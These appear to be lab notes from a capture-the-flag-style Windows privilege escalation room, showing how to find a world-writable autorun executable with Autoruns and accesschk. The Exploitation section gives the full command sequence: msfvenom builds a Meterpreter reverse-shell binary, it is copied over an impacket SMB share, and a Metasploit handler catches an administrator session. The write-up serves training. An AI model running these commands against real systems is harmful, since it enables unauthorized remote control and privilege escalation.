**Detection**

*Windows VM

1. Open command prompt and type: 

```
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

![[remmina_10.10.70.70_10.10.70.70_20240121-111244.png]]


2. In Autoruns, click on the ‘Logon’ tab.  
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.  

![[remmina_10.10.70.70_10.10.70.70_20240121-111100.png]]


4. In command prompt type:

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.

  ![[remmina_10.10.70.70_10.10.70.70_20240121-111409.png]]

**Exploitation**

*Kali VM

1. Open command prompt and type: 

```
msfconsole
```  

![[Pasted image 20240130214515.png]]

2. In Metasploit (msf > prompt) type: 

```
use multi/handler
```  

![[Pasted image 20240130214535.png]]


3. In Metasploit (msf > prompt) type: 

```
set payload windows/meterpreter/reverse_tcp
```  

![[Pasted image 20240130214625.png]]

4. In Metasploit (msf > prompt) type: 

```
set lhost [Kali VM IP Address]
```  

![[Pasted image 20240130214720.png]]

5. In Metasploit (msf > prompt) type: 

```
run
```  

![[Pasted image 20240130215045.png]]

6. Open an additional command prompt and type: 

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
```  

![[Pasted image 20240130215252.png]]

7. Copy the generated file, program.exe, to the Windows VM.

*Using smbserver:
	- on Kali:
```
python /usr/share/doc/python3-impacket/examples/smbserver.py p .
```

![[Pasted image 20240130220313.png]]

*- on Windows

```
copy \\10.8.194.147\p\program.exe
```

![[Pasted image 20240130220505.png]]


*Windows VM

1. Place program.exe in ‘**C:\Program Files\Autorun Program**’.  

![[Pasted image 20240130220724.png]]

2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

Kali VM

1. Wait for a new session to open in Metasploit.  

![[Pasted image 20240130221359.png]]

2. In Metasploit (msf > prompt) type: sessions -i [Session ID]  

![[Pasted image 20240130221424.png]]

3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: 

```
getuid
```

![[Pasted image 20240130221448.png]]

Answer the questions below

Click 'Completed' once you have successfully elevated the machine